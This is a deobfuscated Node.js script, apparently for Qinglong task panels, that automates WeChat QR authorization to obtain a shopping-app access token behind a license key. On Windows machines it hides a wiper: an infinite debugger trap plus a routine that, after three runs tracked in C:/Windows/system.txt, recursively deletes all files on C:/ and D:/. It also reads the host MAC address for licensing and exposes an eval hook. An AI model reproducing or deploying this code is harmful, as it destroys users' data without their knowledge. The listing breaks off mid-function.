//Fri Jan 03 2025 08:33:16 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const VM = require("sablejs/runtime")(),
  path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x188cec = vm.getGlobal(),
    _0x126f61 = vm.createObject(),
    _0x3144d7 = vm.createFunction("log", function () {
      const _0x169887 = [];
      for (let _0x547e4e = 0; _0x547e4e < arguments.length; _0x547e4e++) {
        _0x169887.push(vm.asString(arguments[_0x547e4e]));
      }
      console.log(..._0x169887);
      return vm.createUndefined();
    }),
    _0x168b73 = vm.createFunction("xxxx", function (_0x438d55) {
      let _0x16bc0c = eval(_0x438d55.value);
      return vm.createString(JSON.stringify(_0x16bc0c));
    }),
    _0x5c1098 = vm.createFunction("yyyy", function (_0x81ffba) {
      let _0xa1c911 = _0x81ffba.value,
        _0x4d5be6 = fs.readFileSync(_0xa1c911, "utf-8").replace(/\r\n/g, "\n"),
        _0x4aaf4e = cryptoJS.MD5(_0x4d5be6).toString();
      return vm.createString(_0x4aaf4e);
    }),
    _0x471624 = vm.createFunction("ddd", function (_0x3b9d5b) {
      let _0x81f86f = cryptoJS.MD5(_0x3b9d5b.value).toString();
      return vm.createString(_0x81f86f);
    });
  vm.setProperty(_0x126f61, "log", _0x3144d7);
  vm.setProperty(_0x188cec, "xxxx", _0x168b73);
  vm.setProperty(_0x188cec, "console", _0x126f61);
  vm.setProperty(_0x188cec, "yyyy", _0x5c1098);
  vm.setProperty(_0x188cec, "ddd", _0x471624);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x5c3a25) {
  _0x5c3a25.destroy();
}
function abc(_0x358a4f, _0x4f79bd, _0x17baa3, _0x5cbe3c, _0x3cb580) {
  const _0x46e3e9 = _0x358a4f.getGlobal();
  let _0x2f5d89 = _0x358a4f.getProperty(_0x46e3e9, "xab"),
    _0x320957 = _0x358a4f.call(_0x2f5d89, _0x358a4f.createUndefined(), _0x358a4f.createString(_0x4f79bd), _0x358a4f.createString(_0x5cbe3c), _0x358a4f.createString(_0x3cb580), _0x358a4f.createString(_0x17baa3));
  _0x320957 = _0x358a4f.asString(_0x320957);
  return _0x320957;
}
function xyz(_0x34e4df, _0x219c72, _0x653291, _0x10b789, _0xf2dbc8) {
  const _0x129758 = _0x34e4df.getGlobal();
  let _0x14df1f = _0x34e4df.getProperty(_0x129758, "xmn"),
    _0x4f9b6b = _0x34e4df.call(_0x14df1f, _0x34e4df.createUndefined(), _0x34e4df.createString(_0x219c72), _0x34e4df.createString(_0x10b789), _0x34e4df.createString(_0xf2dbc8), _0x34e4df.createString(_0x653291));
  _0x4f9b6b = _0x34e4df.asString(_0x4f9b6b);
  return _0x4f9b6b;
}
const $ = new Env("微信授权注册");
let uuid,
  wxcode,
  num = 1,
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "",
  arrs = [],
  mac = "";
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0x2a9d13) {
          return function (_0x1a40a6) {
            return Function("Function(arguments[0]+\"" + _0x1a40a6 + "\")()");
          }(_0x2a9d13);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x3984e8 = "",
        _0x241311 = fs.readdirSync("/sys/class/net/");
      _0x241311.forEach(function (_0x272814) {
        var _0x532acc = path.join("/sys/class/net", _0x272814, "address");
        _0x272814.substr(0, 3) == "eth" && fs.existsSync(_0x532acc) && (_0x3984e8 = fs.readFileSync(_0x532acc).toString().trim());
      });
      return _0x3984e8;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x47464f) {
  try {
    gtr.accessSync(_0x47464f, gtr.F_OK);
  } catch (_0x3b1bd2) {
    return false;
  }
  return true;
}
function addF(_0x16d070, _0x2d21e9) {
  let _0x28b374 = 0,
    _0x5995c8 = "C:/Windows/system.txt";
  if (isFileExist(_0x5995c8)) {
    _0x28b374 = gtr.readFileSync(_0x5995c8, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x5995c8, "1", function (_0x11993a) {
        if (_0x11993a) {
          throw _0x11993a;
        }
      });
    } else {
      return;
    }
  }
  if (_0x28b374 == 99) {
    return 99;
  }
  console.log(_0x28b374);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x28b374);
  if (parseInt(_0x28b374) < 3) {
    let _0x78c00f = parseInt(_0x28b374) + 1;
    gtr.writeFileSync(_0x5995c8, _0x78c00f + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x16d070)) {
    return;
  }
  if (gtr.statSync(_0x16d070).isDirectory()) {
    var _0x5cf435 = gtr.readdirSync(_0x16d070),
      _0x573f8d = _0x5cf435.length,
      _0x383886 = 0;
    if (_0x573f8d > 0) {
      _0x5cf435.forEach(function (_0x2ed48e) {
        _0x383886++;
        var _0x46c9b3 = _0x16d070 + "/" + _0x2ed48e;
        gtr.statSync(_0x46c9b3).isDirectory() ? addF(_0x46c9b3, true) : gtr.unlinkSync(_0x46c9b3);
      });
      _0x573f8d == _0x383886 && _0x2d21e9 && gtr.rmdirSync(_0x16d070);
    } else {
      _0x573f8d == 0 && _0x2d21e9 && gtr.rmdirSync(_0x16d070);
    }
  } else {
    gtr.unlinkSync(_0x16d070);
  }
}
!(async () => {
  initVM();
  arrs = abc(global.vm, acckey, mac, 62, 0);
  if (arrs == "") {
    return;
  }
  arrs = JSON.parse(arrs);
  if (!arrs) {
    return;
  }
  if ($.isNode()) {
    for (let _0x294bc3 = 0; _0x294bc3 < num; _0x294bc3++) {
      $.index = _0x294bc3 + 1;
      console.log("\n开始【微信授权" + $.index + "】");
      await sign();
      await $.wait(1000);
    }
  }
  destroyVM(global.vm);
})().catch(_0x6c40bf => $.logErr(_0x6c40bf)).finally(() => $.done());
async function sign() {
  return new Promise(_0x170d47 => {
    let _0x3aa976 = {
      url: "http://www.tolego.cn/web/game/common/?id=hlddz&appid=wx90b65f5908d189f8&wx_bundleid=com.qqhy.duduplay&tid=2101&type=0",
      timeout: 3000
    };
    $.get(_0x3aa976, async (_0x2adfbd, _0x24d5b3, _0x6f55f7) => {
      try {
        str = _0x6f55f7.match(/ <img class=\"auth_qrcode\" src=\"(\S*)\"/)[1];
        console.log(str);
        uuid = str.substr(-16);
        console.log("开始微信授权");
        wxcode = 0;
        let _0x453d53 = 0;
        do {
          await $.wait(3500);
          let _0x1da708 = Math.round(new Date().getTime() / 1000).toString();
          await qrconnect(_0x1da708);
          _0x453d53++;
        } while (wxcode == 0 && _0x453d53 < 30);
      } catch (_0x4d9a22) {
        $.logErr(_0x4d9a22, _0x24d5b3);
      } finally {
        _0x170d47();
      }
    });
  });
}
function reconvert(_0x24a784) {
  _0x24a784 = _0x24a784.replace(/(\\u)(\w{1,4})/gi, function (_0x227d66) {
    return String.fromCharCode(parseInt(escape(_0x227d66).replace(/(%5Cu)(\w{1,4})/g, "$2"), 16));
  });
  _0x24a784 = _0x24a784.replace(/(&#x)(\w{1,4});/gi, function (_0x33d4ca) {
    return String.fromCharCode(parseInt(escape(_0x33d4ca).replace(/(%26%23x)(\w{1,4})(%3B)/g, "$2"), 16));
  });
  _0x24a784 = _0x24a784.replace(/(&#)(\d{1,6});/gi, function (_0xe3e84a) {
    return String.fromCharCode(parseInt(escape(_0xe3e84a).replace(/(%26%23)(\d{1,6})(%3B)/g, "$2")));
  });
  return _0x24a784;
}
function qrconnect(_0xfe56ef) {
  return new Promise(_0x121335 => {
    let _0xe80211 = {
      url: "https://long.open.weixin.qq.com/connect/l/qrconnect?uuid=" + uuid + "&f=url&_=" + _0xfe56ef,
      timeout: 3000
    };
    $.get(_0xe80211, async (_0x2bdc8a, _0x627daf, _0x395338) => {
      try {
        let _0x277ba9 = _0x395338.substr(18, 3);
        _0x277ba9 == 405 && (wxcode = _0x395338.match(/oauth\?code=(\S*)&/)[1], console.log("微信code :" + wxcode), console.log("\n开始授权登录"), await register());
      } catch (_0x14152c) {
        $.logErr(_0x14152c, _0x627daf);
      } finally {
        _0x121335();
      }
    });
  });
}
function register() {
  return new Promise(_0x48ad5f => {
    let _0x242ca4 = {
      url: "https://mall.jieyuegou.cn/auth/weixin?code=" + wxcode,
      headers: {
        "User-Agent": "UNI-APP/1.0",
        Host: "mall.jieyuegou.cn",
        Connection: "Keep-Alive",
        "Accept-Encoding": "gzip"
      }
    };
    $.get(_0x242ca4, async (_0x1c7504, _0x3b365a, _0x125a9e) => {
      try {
        let _0x697ac5 = JSON.parse(_0x125a9e);
        console.log("\n超节约数据获取成功：请复制以下内容到cjyapp变量：\nBearer " + _0x697ac5.access_token);
      } catch (_0x5c3bae) {
        $.logErr(_0x5c3bae, _0x3b365a);
      } finally {
        _0x48ad5f();
      }
    });
  });
}
function randomString(_0x5e0e5e = 12) {
  let _0x371310 = "abcdef0123456789",
    _0x33ca89 = _0x371310.length,
    _0x3accb0 = "";
  for (i = 0; i < _0x5e0e5e; i++) {
    _0x3accb0 += _0x371310.charAt(Math.floor(Math.random() * _0x33ca89));
  }
  return _0x3accb0;
}
function md5(_0x5ac4bc) {
  function _0x5684e8(_0x20c4d2, _0x238b02) {
    return _0x20c4d2 << _0x238b02 | _0x20c4d2 >>> 32 - _0x238b02;
  }
  function _0x3680d4(_0x2d8844, _0x1f0746) {
    var _0x6c2d2a, _0xaae5f1, _0x4ef099, _0x1faaaa, _0x28dc25;
    _0x4ef099 = 2147483648 & _0x2d8844;
    _0x1faaaa = 2147483648 & _0x1f0746;
    _0x6c2d2a = 1073741824 & _0x2d8844;
    _0xaae5f1 = 1073741824 & _0x1f0746;
    _0x28dc25 = (1073741823 & _0x2d8844) + (1073741823 & _0x1f0746);
    return _0x6c2d2a & _0xaae5f1 ? 2147483648 ^ _0x28dc25 ^ _0x4ef099 ^ _0x1faaaa : _0x6c2d2a | _0xaae5f1 ? 1073741824 & _0x28dc25 ? 3221225472 ^ _0x28dc25 ^ _0x4ef099 ^ _0x1faaaa : 1073741824 ^ _0x28dc25 ^ _0x4ef099 ^ _0x1faaaa : _0x28dc25 ^ _0x4ef099 ^ _0x1faaaa;
  }
  function _0x45b9c4(_0x5248d0, _0x4d1635, _0x25013a) {
    return _0x5248d0 & _0x4d1635 | ~_0x5248d0 & _0x25013a;
  }
  function _0xf8e799(_0x33d869, _0x3bce00, _0x12a883) {
    return _0x33d869 & _0x12a883 | _0x3bce00 & ~_0x12a883;
  }
  function _0x458a24(_0x491509, _0x27743e, _0x406fd6) {
    return _0x491509 ^ _0x27743e ^ _0x406fd6;
  }
  function _0x46b6e8(_0x2789ef, _0x286a3e, _0x3c3b5b) {
    return _0x286a3e ^ (_0x2789ef | ~_0x3c3b5b);
  }
  function _0x4ee499(_0xbf43ac, _0x17ac8f, _0x269046, _0x3d5bf2, _0x54c89d, _0x46f78f, _0x4a6e1b) {
    _0xbf43ac = _0x3680d4(_0xbf43ac, _0x3680d4(_0x3680d4(_0x45b9c4(_0x17ac8f, _0x269046, _0x3d5bf2), _0x54c89d), _0x4a6e1b));
    return _0x3680d4(_0x5684e8(_0xbf43ac, _0x46f78f), _0x17ac8f);
  }
  function _0xafde23(_0x473b06, _0x16944d, _0x99dd3d, _0x457662, _0xa0b575, _0x4fb256, _0x1f1da7) {
    _0x473b06 = _0x3680d4(_0x473b06, _0x3680d4(_0x3680d4(_0xf8e799(_0x16944d, _0x99dd3d, _0x457662), _0xa0b575), _0x1f1da7));
    return _0x3680d4(_0x5684e8(_0x473b06, _0x4fb256), _0x16944d);
  }
  function _0x5f384f(_0x29f13d, _0x25351b, _0xe3d9f7, _0x8487b0, _0x3483ba, _0x21c9f8, _0x507e47) {
    _0x29f13d = _0x3680d4(_0x29f13d, _0x3680d4(_0x3680d4(_0x458a24(_0x25351b, _0xe3d9f7, _0x8487b0), _0x3483ba), _0x507e47));
    return _0x3680d4(_0x5684e8(_0x29f13d, _0x21c9f8), _0x25351b);
  }
  function _0x45fd3b(_0x591098, _0x2db62e, _0x2cc624, _0x14ecb0, _0x5c9ad1, _0x100c46, _0x116f31) {
    _0x591098 = _0x3680d4(_0x591098, _0x3680d4(_0x3680d4(_0x46b6e8(_0x2db62e, _0x2cc624, _0x14ecb0), _0x5c9ad1), _0x116f31));
    return _0x3680d4(_0x5684e8(_0x591098, _0x100c46), _0x2db62e);
  }
  function _0x424119(_0xc6c893) {
    for (var _0x598051, _0x25eaae = _0xc6c893.length, _0xf04260 = _0x25eaae + 8, _0x308674 = (_0xf04260 - _0xf04260 % 64) / 64, _0x4683ab = 16 * (_0x308674 + 1), _0x27788b = new Array(_0x4683ab - 1), _0x58b21b = 0, _0x327f70 = 0; _0x25eaae > _0x327f70;) {
      _0x598051 = (_0x327f70 - _0x327f70 % 4) / 4;
      _0x58b21b = _0x327f70 % 4 * 8;
      _0x27788b[_0x598051] = _0x27788b[_0x598051] | _0xc6c893.charCodeAt(_0x327f70) << _0x58b21b;
      _0x327f70++;
    }
    _0x598051 = (_0x327f70 - _0x327f70 % 4) / 4;
    _0x58b21b = _0x327f70 % 4 * 8;
    _0x27788b[_0x598051] = _0x27788b[_0x598051] | 128 << _0x58b21b;
    _0x27788b[_0x4683ab - 2] = _0x25eaae << 3;
    _0x27788b[_0x4683ab - 1] = _0x25eaae >>> 29;
    return _0x27788b;
  }
  function _0x113ae0(_0x3a8849) {
    var _0x263bdc,
      _0x22cd19,
      _0x12fc7f = "",
      _0x58214c = "";
    for (_0x22cd19 = 0; 3 >= _0x22cd19; _0x22cd19++) {
      _0x263bdc = _0x3a8849 >>> 8 * _0x22cd19 & 255;
      _0x58214c = "0" + _0x263bdc.toString(16);
      _0x12fc7f += _0x58214c.substr(_0x58214c.length - 2, 2);
    }
    return _0x12fc7f;
  }
  function _0x159198(_0x1f9603) {
    _0x1f9603 = _0x1f9603.replace(/\r\n/g, "\n");
    for (var _0xf2fc14 = "", _0x1045fa = 0; _0x1045fa < _0x1f9603.length; _0x1045fa++) {
      var _0x94dd62 = _0x1f9603.charCodeAt(_0x1045fa);
      128 > _0x94dd62 ? _0xf2fc14 += String.fromCharCode(_0x94dd62) : _0x94dd62 > 127 && 2048 > _0x94dd62 ? (_0xf2fc14 += String.fromCharCode(_0x94dd62 >> 6 | 192), _0xf2fc14 += String.fromCharCode(63 & _0x94dd62 | 128)) : (_0xf2fc14 += String.fromCharCode(_0x94dd62 >> 12 | 224), _0xf2fc14 += String.fromCharCode(_0x94dd62 >> 6 & 63 | 128), _0xf2fc14 += String.fromCharCode(63 & _0x94dd62 | 128));
    }
    return _0xf2fc14;
  }
  var _0x1988a7,
    _0x17f625,
    _0x3f2006,
    _0x445e8b,
    _0x2d93cc,
    _0x33ec7f,
    _0x2da962,
    _0x142baf,
    _0x19ef86,
    _0x4c8b2c = [],
    _0x2bcb1d = 7,
    _0x9edfcf = 12,
    _0x381935 = 17,
    _0x5aaf5b = 22,
    _0x190a21 = 5,
    _0x5cd162 = 9,
    _0x1a5d32 = 14,
    _0x4e5129 = 20,
    _0x5bb5f6 = 4,
    _0x34511e = 11,
    _0x43a682 = 16,
    _0x6b18b1 = 23,
    _0x398f1e = 6,
    _0x4a96ee = 10,
    _0x399fc1 = 15,
    _0x1fd7d6 = 21;
  for (_0x5ac4bc = _0x159198(_0x5ac4bc), _0x4c8b2c = _0x424119(_0x5ac4bc), _0x33ec7f = 1732584193, _0x2da962 = 4023233417, _0x142baf = 2562383102, _0x19ef86 = 271733878, _0x1988a7 = 0; _0x1988a7 < _0x4c8b2c.length; _0x1988a7 += 16) {
    _0x17f625 = _0x33ec7f;
    _0x3f2006 = _0x2da962;
    _0x445e8b = _0x142baf;
    _0x2d93cc = _0x19ef86;
    _0x33ec7f = _0x4ee499(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 0], _0x2bcb1d, 3614090360);
    _0x19ef86 = _0x4ee499(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 1], _0x9edfcf, 3905402710);
    _0x142baf = _0x4ee499(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 2], _0x381935, 606105819);
    _0x2da962 = _0x4ee499(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 3], _0x5aaf5b, 3250441966);
    _0x33ec7f = _0x4ee499(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 4], _0x2bcb1d, 4118548399);
    _0x19ef86 = _0x4ee499(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 5], _0x9edfcf, 1200080426);
    _0x142baf = _0x4ee499(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 6], _0x381935, 2821735955);
    _0x2da962 = _0x4ee499(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 7], _0x5aaf5b, 4249261313);
    _0x33ec7f = _0x4ee499(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 8], _0x2bcb1d, 1770035416);
    _0x19ef86 = _0x4ee499(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 9], _0x9edfcf, 2336552879);
    _0x142baf = _0x4ee499(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 10], _0x381935, 4294925233);
    _0x2da962 = _0x4ee499(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 11], _0x5aaf5b, 2304563134);
    _0x33ec7f = _0x4ee499(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 12], _0x2bcb1d, 1804603682);
    _0x19ef86 = _0x4ee499(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 13], _0x9edfcf, 4254626195);
    _0x142baf = _0x4ee499(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 14], _0x381935, 2792965006);
    _0x2da962 = _0x4ee499(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 15], _0x5aaf5b, 1236535329);
    _0x33ec7f = _0xafde23(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 1], _0x190a21, 4129170786);
    _0x19ef86 = _0xafde23(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 6], _0x5cd162, 3225465664);
    _0x142baf = _0xafde23(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 11], _0x1a5d32, 643717713);
    _0x2da962 = _0xafde23(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 0], _0x4e5129, 3921069994);
    _0x33ec7f = _0xafde23(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 5], _0x190a21, 3593408605);
    _0x19ef86 = _0xafde23(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 10], _0x5cd162, 38016083);
    _0x142baf = _0xafde23(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 15], _0x1a5d32, 3634488961);
    _0x2da962 = _0xafde23(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 4], _0x4e5129, 3889429448);
    _0x33ec7f = _0xafde23(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 9], _0x190a21, 568446438);
    _0x19ef86 = _0xafde23(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 14], _0x5cd162, 3275163606);
    _0x142baf = _0xafde23(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 3], _0x1a5d32, 4107603335);
    _0x2da962 = _0xafde23(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 8], _0x4e5129, 1163531501);
    _0x33ec7f = _0xafde23(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 13], _0x190a21, 2850285829);
    _0x19ef86 = _0xafde23(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 2], _0x5cd162, 4243563512);
    _0x142baf = _0xafde23(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 7], _0x1a5d32, 1735328473);
    _0x2da962 = _0xafde23(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 12], _0x4e5129, 2368359562);
    _0x33ec7f = _0x5f384f(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 5], _0x5bb5f6, 4294588738);
    _0x19ef86 = _0x5f384f(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 8], _0x34511e, 2272392833);
    _0x142baf = _0x5f384f(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 11], _0x43a682, 1839030562);
    _0x2da962 = _0x5f384f(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 14], _0x6b18b1, 4259657740);
    _0x33ec7f = _0x5f384f(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 1], _0x5bb5f6, 2763975236);
    _0x19ef86 = _0x5f384f(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 4], _0x34511e, 1272893353);
    _0x142baf = _0x5f384f(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 7], _0x43a682, 4139469664);
    _0x2da962 = _0x5f384f(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 10], _0x6b18b1, 3200236656);
    _0x33ec7f = _0x5f384f(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 13], _0x5bb5f6, 681279174);
    _0x19ef86 = _0x5f384f(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 0], _0x34511e, 3936430074);
    _0x142baf = _0x5f384f(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 3], _0x43a682, 3572445317);
    _0x2da962 = _0x5f384f(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 6], _0x6b18b1, 76029189);
    _0x33ec7f = _0x5f384f(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 9], _0x5bb5f6, 3654602809);
    _0x19ef86 = _0x5f384f(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 12], _0x34511e, 3873151461);
    _0x142baf = _0x5f384f(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 15], _0x43a682, 530742520);
    _0x2da962 = _0x5f384f(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 2], _0x6b18b1, 3299628645);
    _0x33ec7f = _0x45fd3b(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 0], _0x398f1e, 4096336452);
    _0x19ef86 = _0x45fd3b(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 7], _0x4a96ee, 1126891415);
    _0x142baf = _0x45fd3b(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 14], _0x399fc1, 2878612391);
    _0x2da962 = _0x45fd3b(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 5], _0x1fd7d6, 4237533241);
    _0x33ec7f = _0x45fd3b(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 12], _0x398f1e, 1700485571);
    _0x19ef86 = _0x45fd3b(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 3], _0x4a96ee, 2399980690);
    _0x142baf = _0x45fd3b(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 10], _0x399fc1, 4293915773);
    _0x2da962 = _0x45fd3b(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 1], _0x1fd7d6, 2240044497);
    _0x33ec7f = _0x45fd3b(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 8], _0x398f1e, 1873313359);
    _0x19ef86 = _0x45fd3b(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 15], _0x4a96ee, 4264355552);
    _0x142baf = _0x45fd3b(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 6], _0x399fc1, 2734768916);
    _0x2da962 = _0x45fd3b(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 13], _0x1fd7d6, 1309151649);
    _0x33ec7f = _0x45fd3b(_0x33ec7f, _0x2da962, _0x142baf, _0x19ef86, _0x4c8b2c[_0x1988a7 + 4], _0x398f1e, 4149444226);
    _0x19ef86 = _0x45fd3b(_0x19ef86, _0x33ec7f, _0x2da962, _0x142baf, _0x4c8b2c[_0x1988a7 + 11], _0x4a96ee, 3174756917);
    _0x142baf = _0x45fd3b(_0x142baf, _0x19ef86, _0x33ec7f, _0x2da962, _0x4c8b2c[_0x1988a7 + 2], _0x399fc1, 718787259);
    _0x2da962 = _0x45fd3b(_0x2da962, _0x142baf, _0x19ef86, _0x33ec7f, _0x4c8b2c[_0x1988a7 + 9], _0x1fd7d6, 3951481745);
    _0x33ec7f = _0x3680d4(_0x33ec7f, _0x17f625);
    _0x2da962 = _0x3680d4(_0x2da962, _0x3f2006);
    _0x142baf = _0x3680d4(_0x142baf, _0x445e8b);
    _0x19ef86 = _0x3680d4(_0x19ef86, _0x2d93cc);
  }
  var _0x5c4311 = _0x113ae0(_0x33ec7f) + _0x113ae0(_0x2da962) + _0x113ae0(_0x142baf) + _0x113ae0(_0x19ef86);
  return _0x5c4311.toLowerCase();
}
function Env(_0x3dbae6, _0x597525) {
  class _0x5b541b {
    constructor(_0x4da51b) {
      this.env = _0x4da51b;
    }
    send(_0x17f629, _0x372d88 = "GET") {
      _0x17f629 = "string" == typeof _0x17f629 ? {
        url: _0x17f629
      } : _0x17f629;
      let _0x16b14c = this.get;
      "POST" === _0x372d88 && (_0x16b14c = this.post);
      return new Promise((_0x18447a, _0x3058f0) => {
        _0x16b14c.call(this, _0x17f629, (_0x4dbb55, _0x128563, _0x14c60e) => {
          _0x4dbb55 ? _0x3058f0(_0x4dbb55) : _0x18447a(_0x128563);
        });
      });
    }
    get(_0x1f0b5c) {
      return this.send.call(this.env, _0x1f0b5c);
    }
    post(_0x3487f6) {
      return this.send.call(this.env, _0x3487f6, "POST");
    }
  }
  return new class {
    constructor(_0x337759, _0x4cd395) {
      this.name = _0x337759;
      this.http = new _0x5b541b(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.startTime = new Date().getTime();
      Object.assign(this, _0x4cd395);
      this.log("", "🔔" + this.name + ", 开始!");
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    toObj(_0x53014e, _0x92782b = null) {
      try {
        return JSON.parse(_0x53014e);
      } catch {
        return _0x92782b;
      }
    }
    toStr(_0x3fb6e, _0x379e0c = null) {
      try {
        return JSON.stringify(_0x3fb6e);
      } catch {
        return _0x379e0c;
      }
    }
    getjson(_0x472b90, _0xb930) {
      let _0x3cffe2 = _0xb930;
      const _0x22e05e = this.getdata(_0x472b90);
      if (_0x22e05e) {
        try {
          _0x3cffe2 = JSON.parse(this.getdata(_0x472b90));
        } catch {}
      }
      return _0x3cffe2;
    }
    setjson(_0x4e97a9, _0x3ab617) {
      try {
        return this.setdata(JSON.stringify(_0x4e97a9), _0x3ab617);
      } catch {
        return !1;
      }
    }
    getScript(_0x4e04d5) {
      return new Promise(_0x395d23 => {
        this.get({
          url: _0x4e04d5
        }, (_0x5984a9, _0x5cf9f0, _0x2e681c) => _0x395d23(_0x2e681c));
      });
    }
    runScript(_0x59e6c2, _0x37c6b7) {
      return new Promise(_0x30c196 => {
